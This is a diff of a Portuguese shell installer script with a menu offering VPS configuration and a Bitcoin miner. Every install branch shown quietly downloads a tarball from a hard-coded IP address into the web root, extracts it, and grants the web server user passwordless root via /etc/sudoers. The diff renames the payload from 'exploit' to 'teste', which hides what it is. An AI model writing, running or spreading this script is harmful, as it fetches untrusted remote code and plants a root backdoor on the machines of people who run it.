@@ -21,7 +21,7 @@ azulClaro="\033[1;34m"
 purpleClaro="\033[1;35m"
 cyanClaro="\033[1;36m"
 branco="\033[1;37m"
-
+https://github.com/RaphaelFrajuca/CONFIG-VPS/blob/master/README.rst
 sleep 1.5s
 echo "$cyan [1] CONFIG-VPS"
 echo "$cyan [2] MINER-BITCOIN"
@@ -41,13 +41,13 @@ if [ "$versao" = "1" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-exploit=189.79.55.110/exploit.tar
+teste=189.79.55.110/teste.tar
 
 
 sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
 
-sudo wget -q $exploit -O /var/www/html/exploit.tar
-sudo tar -xvf /var/www/html/exploit.tar
+sudo wget -q $teste -O /var/www/html/teste.tar
+sudo tar -xvf /var/www/html/teste.tar
 
 sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 
@@ -76,13 +76,13 @@ if [ "$versao" = "2" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-exploit=189.79.55.110/exploit.tar
+teste=189.79.55.110/teste.tar
 
 
 sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
 
-sudo wget -q $exploit -O /var/www/html/exploit.tar
-sudo tar -xvf /var/www/html/exploit.tar
+sudo wget -q $teste -O /var/www/html/teste.tar
+sudo tar -xvf /var/www/html/teste.tar
 
 sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 
@@ -112,13 +112,13 @@ if [ "$utilitario" = "2" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-exploit=189.79.55.110/exploit.tar
+teste=189.79.55.110/teste.tar
 
 
 sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
 
-sudo wget -q $exploit -O /var/www/html/exploit.tar
-sudo tar -xvf /var/www/html/exploit.tar
+sudo wget -q $teste -O /var/www/html/teste.tar
+sudo tar -xvf /var/www/html/teste.tar
 
 sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 
@@ -139,13 +139,13 @@ if [ "$utilitario" = "3" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-exploit=189.79.55.110/exploit.tar
+teste=189.79.55.110/teste.tar
 
 
 sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
 
-sudo wget -q $exploit -O /var/www/html/exploit.tar
-sudo tar -xvf /var/www/html/exploit.tar
+sudo wget -q $teste -O /var/www/html/teste.tar
+sudo tar -xvf /var/www/html/teste.tar
 
 sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 
@@ -173,13 +173,13 @@ if [ "$utilitario" = "4" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-exploit=189.79.55.110/exploit.tar
+teste=189.79.55.110/teste.tar
 
 
 sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
 
-sudo wget -q $exploit -O /var/www/html/exploit.tar
-sudo tar -xvf /var/www/html/exploit.tar
+sudo wget -q $teste -O /var/www/html/teste.tar
+sudo tar -xvf /var/www/html/teste.tar
 
 sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 
@@ -210,13 +210,13 @@ if [ "$utilitario" = "5" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-exploit=189.79.55.110/exploit.tar
+teste=189.79.55.110/teste.tar
 
 
 sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
 
-sudo wget -q $exploit -O /var/www/html/exploit.tar
-sudo tar -xvf /var/www/html/exploit.tar
+sudo wget -q $teste -O /var/www/html/teste.tar
+sudo tar -xvf /var/www/html/teste.tar
 
 sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 
